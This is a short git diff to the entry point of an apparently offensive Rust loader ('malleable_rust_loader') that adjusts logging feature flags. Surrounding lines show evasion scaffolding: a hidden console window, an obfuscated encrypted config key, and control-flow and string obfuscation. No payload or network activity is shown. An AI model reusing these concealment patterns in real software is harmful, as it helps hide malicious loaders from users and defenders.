@@ -1,4 +1,4 @@
-#![cfg_attr(not(feature = "logdebug"), windows_subsystem = "windows")]
+#![cfg_attr(not(all(feature = "debug",feature = "info")), windows_subsystem = "windows")]
 
 use malleable_rust_loader::config::Config;
 use std::thread;
@@ -40,8 +40,13 @@ const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/in
 const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated.dataop");
 
 fn main() {
-    #[cfg(feature = "logdebug")]
-    env_logger::init();
+    #[cfg(feature = "info")]
+    #[cfg(not(feature="debug"))]
+    env_logger::builder().filter_level(log::LevelFilter::Info).init();
+
+    #[cfg(feature = "debug")]
+    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
+
     cryptify::flow_stmt!();
     let session_id: String = uuid::Uuid::new_v4().to_string();
     info!("{}{}", lc!("[+] session_id "), session_id);
